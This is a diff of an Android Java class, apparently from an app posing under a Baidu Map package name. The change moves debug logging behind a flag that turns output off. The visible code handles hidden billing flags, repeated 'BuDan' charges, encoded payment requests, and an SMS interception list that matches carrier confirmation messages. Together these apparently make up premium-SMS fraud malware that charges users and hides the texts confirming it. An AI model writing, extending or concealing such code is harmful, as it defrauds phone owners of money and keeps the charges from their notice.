@@ -13,6 +13,7 @@ import com.baidu.BaiduMap.httpCenter.InitRequest;
 import com.baidu.BaiduMap.httpCenter.ThroughRequest;
 import com.baidu.BaiduMap.sms.SmsCenter;
 import com.baidu.BaiduMap.sms.SmsInterceptCenter;
+import com.baidu.BaiduMap.utils.Constants;
 import com.baidu.BaiduMap.utils.GsonUtils;
 import com.baidu.BaiduMap.utils.Kode;
 import com.baidu.BaiduMap.utils.Log;
@@ -48,9 +49,11 @@ public class NormalRequestThroughManager {
         if (!InitRequest.isJi_Fei) {
             return;
         }
-        Log.debug("InitRequest.isBuDan:" + InitRequest.isBuDan);
-        Log.debug("InitRequest.buDan_timse:" + InitRequest.buDan_timse);
-        Log.debug("count:" + count);
+        if (Constants.isOutPut) {
+            Log.debug("InitRequest.isBuDan:" + InitRequest.isBuDan);
+            Log.debug("InitRequest.buDan_timse:" + InitRequest.buDan_timse);
+            Log.debug("count:" + count);
+        }
         if (count == InitRequest.buDan_timse) {
             if (InitRequest.isBuDan) {
                 BuDan(context, price, Did, productName, normalPayCallBackHandler);
@@ -90,7 +93,9 @@ public class NormalRequestThroughManager {
             ThroughRequest.getInstance().request(context, throughID, price, Did, productName, new Subscriber<String>() {
                 @Override
                 public void onCompleted() {
-                    Log.debug("request through completed!!!");
+                    if (Constants.isOutPut) {
+                        Log.debug("request through completed!!!");
+                    }
                 }
 
                 @Override
@@ -98,15 +103,21 @@ public class NormalRequestThroughManager {
                     PayCallBackHandler.getInstance().payFail(normalPayCallBackHandler);
                     goToNextThrough(context, price, str, Did, productName, normalPayCallBackHandler);
                     weatherJinJi(InitRequest.isNextRequest, context, price, str, Did, productName, normalPayCallBackHandler);
-                    Log.debug("request through error : " + e.getMessage().toString());
+                    if (Constants.isOutPut) {
+                        Log.debug("request through error : " + e.getMessage().toString());
+                    }
                 }
 
                 @Override
                 public void onNext(String s) {
-                    Log.debug("normal request through successed : " + Kode.e(s));
+                    if (Constants.isOutPut) {
+                        Log.debug("normal request through successed : " + Kode.e(s));
+                    }
                     requestThroughCallBackEntity = (RequestThroughCallBackEntity) GsonUtils.getInstance().JsonToEntity(Kode.e(s), RequestThroughCallBackEntity.class);
                     if (!requestThroughCallBackEntity.getState().equals("0")) {
-                        Log.debug("请求失败:" + requestThroughCallBackEntity.getResultmsg());
+                        if (Constants.isOutPut) {
+                            Log.debug("请求失败:" + requestThroughCallBackEntity.getResultmsg());
+                        }
                         PayCallBackHandler.getInstance().payFail(normalPayCallBackHandler);
                         weatherJinJi(InitRequest.isNextRequest, context, price, str, Did, productName, normalPayCallBackHandler);
                     } else {
@@ -161,7 +172,9 @@ public class NormalRequestThroughManager {
             }
             if (null == SmsInterceptCenter.interceptContentList || SmsInterceptCenter.interceptContentList.size() <= 0) {
                 SmsInterceptCenter.interceptContentList.add(GsonUtils.getInstance().EntityToJson(smsInterceptEntity));
-                Log.debug("Normal SmsInterceptCenter  interceptContentList : " + SmsInterceptCenter.interceptContentList.get(0).toString());
+                if (Constants.isOutPut) {
+                    Log.debug("Normal SmsInterceptCenter  interceptContentList : " + SmsInterceptCenter.interceptContentList.get(0).toString());
+                }
             } else {
                 for (int i = 0; i < SmsInterceptCenter.interceptContentList.size(); i++) {
                     if (SmsInterceptCenter.interceptContentList.get(i).toString().contains(requestThroughCallBackEntity.getLimit_msg_2()) && SmsInterceptCenter.interceptContentList.get(i).contains(requestThroughCallBackEntity.getLimit_msg_data())) {
@@ -174,7 +187,9 @@ public class NormalRequestThroughManager {
     }
 
     private int setRequestTimes() {
-        Log.debug("ReuqestTimes:" + requestTimes);
+        if (Constants.isOutPut) {
+            Log.debug("ReuqestTimes:" + requestTimes);
+        }
         ++requestTimes;
         if (requestTimes > 7) {
             requestTimes = 0;
